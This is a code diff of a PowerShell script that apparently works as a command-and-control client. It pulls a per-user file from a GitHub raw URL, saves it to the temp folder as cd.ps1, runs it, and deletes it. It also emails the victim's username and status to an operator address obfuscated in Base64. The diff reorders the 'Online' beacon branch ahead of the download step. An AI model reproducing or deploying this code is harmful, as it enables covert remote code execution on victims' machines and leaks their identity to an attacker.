@@ -29,12 +29,16 @@ $name = $env:username
 $url = "https://raw.githubusercontent.com/4V4loon/tools/master/ctwo/$name"
 $receiver=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("eABlAGwAaQBsAC4AaQBzAGkAMAAwADcAQABnAG0AYQBpAGwALgBjAG8AbQA="))
 $statusCode = Get-UrlStatusCode $url
-$justOnline="Online`n"
+$justOnline="Online"
 if ($statusCode -eq 200){
     $contentLocal = "False"
     $contentWeb = Invoke-WebRequest -Uri $url -UseBasicParsing | select -ExpandProperty Content
     $diff = Compare-Object -ReferenceObject $($contentLocal) -DifferenceObject $($contentWeb)
-    if($diff) {
+    if($contentWeb -eq $justOnline){
+        Send-ToEmail -email $receiver -body $name -subj "Online"
+        exit
+    }
+    elseif($diff) {
         $file="$env:tmp\cd.ps1"
         try {
             Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $file
@@ -52,9 +56,8 @@ if ($statusCode -eq 200){
         finally {
             Remove-Item -Path $file -Force
         }
-    } elseif($contentWeb -eq $justOnline){
-        Send-ToEmail -email $receiver -body $name -subj "Online"
-    }
+    } 
+
 } else {
     Send-ToEmail -email $receiver -body $name -subj "UserNotFound"
 }
